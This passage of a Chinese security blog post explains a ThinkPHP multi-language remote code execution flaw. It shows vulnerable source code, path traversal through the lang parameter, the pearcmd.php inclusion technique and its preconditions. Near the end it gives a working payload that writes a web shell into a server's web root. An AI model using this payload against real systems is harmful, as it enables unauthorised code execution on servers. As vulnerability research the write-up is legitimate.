+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> ((<span class="keyword">array</span>) <span class="variable">$file</span> <span class="keyword">as</span> <span class="variable">$_file</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">is_file</span>(<span class="variable">$_file</span>)) &#123;</span><br><span class="line">                <span class="variable">$result</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parse</span>(<span class="variable">$_file</span>);</span><br><span class="line">                <span class="variable">$lang</span>   = <span class="title function_ invoke__">array_change_key_case</span>(<span class="variable">$result</span>) + <span class="variable">$lang</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>让$_file存在 利用..&#x2F;..&#x2F;..&#x2F;目录穿越 绕过if </p>
+<p>进入parse()</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parse</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$file</span></span>): <span class="title">array</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$type</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$file</span>, PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span> (<span class="variable">$type</span>) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;php&#x27;</span>:</span><br><span class="line">                <span class="variable">$result</span> = <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;yml&#x27;</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;yaml&#x27;</span>:</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;yaml_parse_file&#x27;</span>)) &#123;</span><br><span class="line">                    <span class="variable">$result</span> = <span class="title function_ invoke__">yaml_parse_file</span>(<span class="variable">$file</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">isset</span>(<span class="variable">$result</span>) &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable">$result</span>) ? <span class="variable">$result</span> : [];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>$type就是php 它给加的默认后缀</p>
+<h4 id="pear-写入文件"><a href="#pear-写入文件" class="headerlink" title="pear 写入文件"></a>pear 写入文件</h4><p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp">https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp</a></p>
+<p>利用条件</p>
+<p>1）服务器上安装pear，也就是存在pearcmd.php。同时知道pearcmd.php的文件路径</p>
+<p>2）web环境下在php.ini中register_argc_argv设置为On</p>
+<p>3）存在文件包含，可以包含php文件并且没有open_basedir的限制</p>
+<p>php的pear扩展是一个命令行扩展管理工具，默认的安装路径在<code>/usr/local/lib/php/pearcmd.php</code>，在命令行下可以用<code>pear</code>或<code>php /usr/local/lib/php/pearcmd.php</code>运行，虽然不是在web的目录下，但是如果存在文件包含漏洞，我们就可以运行这个命令行工具</p>
+<p>我们再来看<code>register_argc_argv</code>选项，在这个选项字段如果选了<code>ON</code>的话，URL中?后面的内容会全部传入至<code>$_SERVER[&#39;argv&#39;]</code>这个变量内，无论后面的内容是否有等号。</p>
+<p>docker 下的payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lang=../../../../../../../../usr/local/lib/php/pearcmd&amp;+config-create+/+/var/www/html/shell.php</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://example.com">admire@</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2023/11/02/thinkphp%E5%A4%9A%E8%AF%AD%E8%A8%80RCE/">http://example.com/2023/11/02/thinkphp%E5%A4%9A%E8%AF%AD%E8%A8%80RCE/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">admire@</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/thinkphp/">thinkphp</a></div><div class="post_share"><div class="social-share" data-image="/img/avatar.webp" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.png" target="_blank"><img class="post-qr-code-img" src="/img/wechat.png" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="/img/alipay.jpg" target="_blank"><img class="post-qr-code-img" src="/img/alipay.jpg" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2023/10/31/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%B0%8F%E8%AE%B0-ssh/" title="权限维持小记-ssh"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">权限维持小记-ssh</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.webp" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">admire@</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">22</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">13</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/c0rr1Y"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">坐地日行八万里，巡天遥看一千河  QQ:2644895923</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#thinkphp-%E5%A4%9A%E8%AF%AD%E8%A8%80RCE"><span class="toc-number">1.</span> <span class="toc-text">thinkphp 多语言RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87"><span class="toc-number">1.0.1.</span> <span class="toc-text">环境准备</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4"><span class="toc-number">1.0.2.</span> <span class="toc-text">影响范围</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%9A%E8%AF%AD%E8%A8%80%E6%A8%A1%E5%BC%8F%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.1.</span> <span class="toc-text">多语言模式下的文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%BB%E6%89%BE%E6%94%BB%E5%87%BB%E9%93%BE"><span class="toc-number">1.1.0.1.</span> <span class="toc-text">寻找攻击链</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9E%84%E5%BB%BA%E6%94%BB%E5%87%BB%E5%8F%82%E6%95%B0"><span class="toc-number">1.1.0.2.</span> <span class="toc-text">构建攻击参数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pear-%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6"><span class="toc-number">1.1.0.3.</span> <span class="toc-text">pear 写入文件</span></a></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/11/02/thinkphp%E5%A4%9A%E8%AF%AD%E8%A8%80RCE/" title="thinkphp多语言RCE">thinkphp多语言RCE</a><time datetime="2023-11-02T12:09:25.000Z" title="发表于 2023-11-02 20:09:25">2023-11-02</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/10/31/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%B0%8F%E8%AE%B0-ssh/" title="权限维持小记-ssh">权限维持小记-ssh</a><time datetime="2023-10-31T09:08:01.000Z" title="发表于 2023-10-31 17:08:01">2023-10-31</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/10/31/Gemini-Pentest-v1/" title="Gemini-Pentest-v1">Gemini-Pentest-v1</a><time datetime="2023-10-31T08:34:50.000Z" title="发表于 2023-10-31 16:34:50">2023-10-31</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/09/09/Fastjson%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" title="Fastjson漏洞总结">Fastjson漏洞总结</a><time datetime="2023-09-09T09:47:31.000Z" title="发表于 2023-09-09 17:47:31">2023-09-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/09/09/linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/" title="linux提权总结">linux提权总结</a><time datetime="2023-09-09T09:46:29.000Z" title="发表于 2023-09-09 17:46:29">2023-09-09</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By admire@</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>
